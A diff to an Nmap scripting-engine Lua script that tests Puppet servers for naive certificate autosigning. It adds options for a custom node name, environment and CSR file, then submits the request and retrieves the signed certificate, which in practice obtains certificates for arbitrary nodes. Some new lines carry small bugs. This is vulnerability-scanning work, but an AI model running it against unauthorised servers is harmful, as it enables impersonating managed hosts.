@@ -3,6 +3,7 @@ local stdnse = require "stdnse"
 local http = require "http"
 local vulns = require "vulns"
 local table = require "table"
+local io = require "io"
 
 description = [[
 Detects if naive signing is enabled on a Puppet server. This enables attackers
@@ -79,7 +80,9 @@ categories = {"intrusive", "vuln"}
 portrule = shortport.port_or_service( {8140} , "puppet", "tcp", "open")
 
 -- dummy certificate signing request to sign
-local DUMMY_CSR = [[
+-- note that replacing the requested node name from the CSR doesn't work
+-- you have to generate a new CSR 
+local DUMMY_CSR= [[
 -----BEGIN CERTIFICATE REQUEST-----
 MIIEZTCCAk0CAQAwIDEeMBwGA1UEAwwVYWdlbnR6ZXJvLmxvY2FsZG9tYWluMIIC
 IjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAu1nXwvGCczXPa/6gQupULuVM
@@ -107,11 +110,13 @@ zUdrhHojoA2wRsT3zGiXjct8VKVydnRoFRHHoZTQXk6sR81pgV0XiA23pB42dOqZ
 L3Gga99UTASI0PZ/dEQA2sooKhIt7pCDMw==
 -----END CERTIFICATE REQUEST-----
 ]]
+local DEFAULT_NODE = "agentzero.localdomain"
+local DEFAULT_ENV = "production"
 
 -- different versions have different paths to the certificate signing endpoint
 local PATHS = {
-  '/production/certificate_request/agentzero.localdomain', -- version 3.8
-  '/puppet-ca/v1/certificate_request/agentzero.localdomain?environment=production' -- version 4.10
+  v3='/%s/certificate_request/%s', -- version 3.8
+  v4='/puppet-ca/v1/certificate_request/%s?environment=%s' -- version 4.10
 }
 
 action = function(host, port)
@@ -128,6 +133,29 @@ Naive autosigning causes the Puppet CA to autosign ALL CSRs. Attackers will be a
   local options = {}
   options['header'] = {}
 
+  -- parse args
+  local node = stdnse.get_script_args(SCRIPT_NAME .. ".node") or DEFAULT_NODE
+  local env = stdnse.get_script_args(SCRIPT_NAME .. "env") or DEFAULT_ENV
+
+  local csr_file = stdnse.get_script_args(SCRIPT_NAME .. ".csr")
+  local csr
+  stdnse.debug1("File: ", csr_file)
+
+  -- load the custom csr if it is provided
+  if csr_file then
+    local csr_h = io.open(csr_file, "r")
+    csr = csr_h:read("*all")
+    stdnse.debug1(csr)
+    if (not(csr)) or not(string.match(csr, "BEGIN CERTIFICATE REQUEST")) then
+      stdnse.debug1("Couldn't load CSR %s", csr_file)
+    end
+    csr_h.close()
+  else
+    csr = DUMMY_CSR
+  end
+
+  stdnse.debug1("CSR: %s", csr)
+
   -- set acceptable API response to s, so response is returned
   -- see https://github.com/puppetlabs/puppet/blob/master/api/docs/http_certificate_request.md#supported-response-formats
   options['header']['Accept'] = 's'
@@ -136,15 +164,23 @@ Naive autosigning causes the Puppet CA to autosign ALL CSRs. Attackers will be a
   -- see https://docs.puppet.com/puppet/3.8/http_api/http_certificate_request.html
   options['header']['Content-Type'] = 'text/plain'
 
-  for _, path in ipairs(PATHS) do
-    local response = http.put(host, port, path, options, DUMMY_CSR)
+  for version, path in pairs(PATHS) do
+    if version == "v3" then
+      path = string.format(path, env, node)
+    elseif version == "v4" then
+      path = string.format(path, node, env)
+    end
+
+    stdnse.debug1("Path: %s", path)
+    local response = http.put(host, port, path, options, csr)
     stdnse.debug1("Status of CSR: %s", response.status)
     stdnse.debug2("Response for CSR: %s", response.body)
     -- 200 means it worked
     if response.status == 200 then
       if response.body == "" then
         --likely version 4.10, so have to get the cert out from searching
-        local get_cert_response = http.get(host, port, "/puppet-ca/v1/certificate/agentzero.localdomain?environment=production", options)
+        local get_cert_path = string.format("/puppet-ca/v1/certificate/%s?environment=%s", node, env)
+        local get_cert_response = http.get(host, port, get_cert_path, options)
         response = get_cert_response
         stdnse.debug2("Response for Get Cert: %s", get_cert_response.body)
       end
@@ -154,9 +190,11 @@ Naive autosigning causes the Puppet CA to autosign ALL CSRs. Attackers will be a
         table.insert(vuln_table.extra_info, response.body)
         break
       end
-    elseif http.response_contains(response, "already has a signed certificate; ignoring certificate request") then
+    elseif http.response_contains(response, "has a signed certificate; ignoring certificate request") then
+      stdnse.debug1("it should come here")
       vuln_table.state = vulns.STATE.VULN
-      local get_cert_response = http.get(host, port, "/production/certificate/agentzero.localdomain", options)
+      local get_cert_path = string.format("/%s/certificate/%s", env, node)
+      local get_cert_response = http.get(host, port, get_cert_path, options)
       table.insert(vuln_table.extra_info, get_cert_response.body)
       break
     end
